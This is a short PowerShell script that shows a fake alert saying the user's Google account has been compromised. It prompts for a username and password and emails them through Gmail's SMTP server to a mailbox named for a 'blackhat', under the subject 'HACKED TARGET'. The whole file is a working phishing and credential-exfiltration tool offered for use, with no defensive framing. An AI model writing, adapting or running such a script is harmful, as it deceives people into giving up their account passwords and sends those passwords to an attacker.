clear
$mycredentials = Get-Credential
Write-Host "ALERT your google account has been compromised! please enter your credentials for verification"

$name = Read-Host "Username/Email"
$pwd = Read-Host "password"




Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From unknownroguee@gmail.com -To unknownblackhat01@gmail.com -Subject 'HACKED TARGET' -Body ("$name $pwd") -Credential ($mycredentials)
exit

